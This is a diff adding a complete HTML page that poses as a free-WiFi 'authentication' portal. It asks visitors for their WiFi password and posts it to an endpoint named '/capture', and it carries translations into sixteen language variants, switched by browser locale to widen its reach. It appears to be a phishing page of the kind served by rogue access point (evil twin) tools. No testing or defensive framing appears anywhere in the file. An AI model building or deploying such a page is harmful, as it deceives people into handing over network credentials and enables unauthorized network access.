@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title data-i18n="page_title">WiFi Authentication</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            width: 350px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .login-card h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .login-card p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .wifi-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: scale(1.02);
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="wifi-icon">📶</div>
+        <h2 data-i18n="wifi_auth">WiFi Authentication</h2>
+        <p data-i18n="auth_prompt">Please verify your identity to continue using free WiFi</p>
+        <form method="POST" action="/capture">
+            <input type="password" name="password" data-i18n-placeholder="password_placeholder" placeholder="Enter WiFi password" required autocomplete="off">
+            <button type="submit" data-i18n="connect_btn">Connect</button>
+        </form>
+        <div class="footer" data-i18n="footer_text">⚡ Free WiFi service</div>
+    </div>
+
+<script>
+var I18N = {
+    "en": {
+        page_title: "WiFi Authentication",
+        wifi_auth: "WiFi Authentication",
+        auth_prompt: "Please verify your identity to continue using free WiFi",
+        password_placeholder: "Enter WiFi password",
+        connect_btn: "Connect",
+        footer_text: "⚡ Free WiFi service"
+    },
+    "zh-CN": {
+        page_title: "WiFi认证",
+        wifi_auth: "WiFi 认证",
+        auth_prompt: "请验证您的身份以继续使用免费WiFi服务",
+        password_placeholder: "请输入WiFi密码",
+        connect_btn: "连接网络",
+        footer_text: "⚡ 本WiFi提供免费上网服务"
+    },
+    "zh-TW": {
+        page_title: "WiFi認證",
+        wifi_auth: "WiFi 認證",
+        auth_prompt: "請驗證您的身份以繼續使用免費WiFi服務",
+        password_placeholder: "請輸入WiFi密碼",
+        connect_btn: "連接網絡",
+        footer_text: "⚡ 本WiFi提供免費上網服務"
+    },
+    "ja": {
+        page_title: "WiFi認証",
+        wifi_auth: "WiFi 認証",
+        auth_prompt: "無料WiFiを継続してご利用いただくため、本人確認をお願いします",
+        password_placeholder: "WiFiパスワードを入力",
+        connect_btn: "接続する",
+        footer_text: "⚡ 無料WiFiサービス"
+    },
+    "ko": {
+        page_title: "WiFi 인증",
+        wifi_auth: "WiFi 인증",
+        auth_prompt: "무료 WiFi 서비스를 계속 이용하려면 본인 인증을 해주세요",
+        password_placeholder: "WiFi 비밀번호 입력",
+        connect_btn: "연결하기",
+        footer_text: "⚡ 무료 WiFi 서비스"
+    },
+    "ar": {
+        page_title: "مصادقة WiFi",
+        wifi_auth: "مصادقة WiFi",
+        auth_prompt: "يرجى التحقق من هويتك لمواصلة استخدام خدمة WiFi المجانية",
+        password_placeholder: "أدخل كلمة مرور WiFi",
+        connect_btn: "اتصال",
+        footer_text: "⚡ خدمة WiFi مجانية"
+    },
+    "ru": {
+        page_title: "Аутентификация WiFi",
+        wifi_auth: "Аутентификация WiFi",
+        auth_prompt: "Пожалуйста, подтвердите свою личность для продолжения использования бесплатного WiFi",
+        password_placeholder: "Введите пароль WiFi",
+        connect_btn: "Подключиться",
+        footer_text: "⚡ Бесплатный WiFi"
+    },
+    "fr": {
+        page_title: "Authentification WiFi",
+        wifi_auth: "Authentification WiFi",
+        auth_prompt: "Veuillez vérifier votre identité pour continuer à utiliser le WiFi gratuit",
+        password_placeholder: "Entrez le mot de passe WiFi",
+        connect_btn: "Se connecter",
+        footer_text: "⚡ Service WiFi gratuit"
+    },
+    "de": {
+        page_title: "WiFi-Authentifizierung",
+        wifi_auth: "WiFi-Authentifizierung",
+        auth_prompt: "Bitte bestätigen Sie Ihre Identität, um das kostenlose WiFi weiter zu nutzen",
+        password_placeholder: "WiFi-Passwort eingeben",
+        connect_btn: "Verbinden",
+        footer_text: "⚡ Kostenloser WiFi-Dienst"
+    },
+    "es": {
+        page_title: "Autenticación WiFi",
+        wifi_auth: "Autenticación WiFi",
+        auth_prompt: "Verifique su identidad para seguir usando WiFi gratis",
+        password_placeholder: "Ingrese la contraseña WiFi",
+        connect_btn: "Conectar",
+        footer_text: "⚡ Servicio WiFi gratuito"
+    },
+    "pt": {
+        page_title: "Autenticação WiFi",
+        wifi_auth: "Autenticação WiFi",
+        auth_prompt: "Por favor, verifique sua identidade para continuar usando WiFi gratuito",
+        password_placeholder: "Digite a senha WiFi",
+        connect_btn: "Conectar",
+        footer_text: "⚡ Serviço WiFi gratuito"
+    },
+    "it": {
+        page_title: "Autenticazione WiFi",
+        wifi_auth: "Autenticazione WiFi",
+        auth_prompt: "Verifica la tua identità per continuare a utilizzare il WiFi gratuito",
+        password_placeholder: "Inserisci la password WiFi",
+        connect_btn: "Connetti",
+        footer_text: "⚡ Servizio WiFi gratuito"
+    },
+    "th": {
+        page_title: "การยืนยันตัวตน WiFi",
+        wifi_auth: "การยืนยันตัวตน WiFi",
+        auth_prompt: "โปรดยืนยันตัวตนของคุณเพื่อใช้ WiFi ฟรีต่อไป",
+        password_placeholder: "ป้อนรหัสผ่าน WiFi",
+        connect_btn: "เชื่อมต่อ",
+        footer_text: "⚡ บริการ WiFi ฟรี"
+    },
+    "vi": {
+        page_title: "Xác thực WiFi",
+        wifi_auth: "Xác thực WiFi",
+        auth_prompt: "Vui lòng xác minh danh tính để tiếp tục sử dụng WiFi miễn phí",
+        password_placeholder: "Nhập mật khẩu WiFi",
+        connect_btn: "Kết nối",
+        footer_text: "⚡ Dịch vụ WiFi miễn phí"
+    },
+    "hi": {
+        page_title: "WiFi प्रमाणीकरण",
+        wifi_auth: "WiFi प्रमाणीकरण",
+        auth_prompt: "मुफ्त WiFi का उपयोग जारी रखने के लिए कृपया अपनी पहचान सत्यापित करें",
+        password_placeholder: "WiFi पासवर्ड दर्ज करें",
+        connect_btn: "कनेक्ट करें",
+        footer_text: "⚡ मुफ्त WiFi सेवा"
+    },
+    "tr": {
+        page_title: "WiFi Kimlik Doğrulama",
+        wifi_auth: "WiFi Kimlik Doğrulama",
+        auth_prompt: "Ücretsiz WiFi kullanmaya devam etmek için lütfen kimliğinizi doğrulayın",
+        password_placeholder: "WiFi şifresini girin",
+        connect_btn: "Bağlan",
+        footer_text: "⚡ Ücretsiz WiFi hizmeti"
+    }
+};
+
+function detectLanguage() {
+    var lang = (navigator.language || navigator.userLanguage || "en").split("-")[0];
+    var full = navigator.language || "en";
+    if (I18N[full]) return full;
+    if (I18N[lang]) return lang;
+    if (lang === "zh") return "zh-CN";
+    return "en";
+}
+
+function applyLanguage(lang) {
+    var dict = I18N[lang];
+    document.documentElement.lang = lang;
+
+    if (lang === "ar") {
+        document.body.style.direction = "rtl";
+    }
+
+    document.querySelectorAll("[data-i18n]").forEach(function(el) {
+        var key = el.getAttribute("data-i18n");
+        if (dict[key]) el.textContent = dict[key];
+    });
+
+    document.querySelectorAll("[data-i18n-placeholder]").forEach(function(el) {
+        var key = el.getAttribute("data-i18n-placeholder");
+        if (dict[key]) el.placeholder = dict[key];
+    });
+
+    if (dict.page_title) document.title = dict.page_title;
+}
+
+(function() {
+    applyLanguage(detectLanguage());
+})();
+</script>
+</body>
+</html>
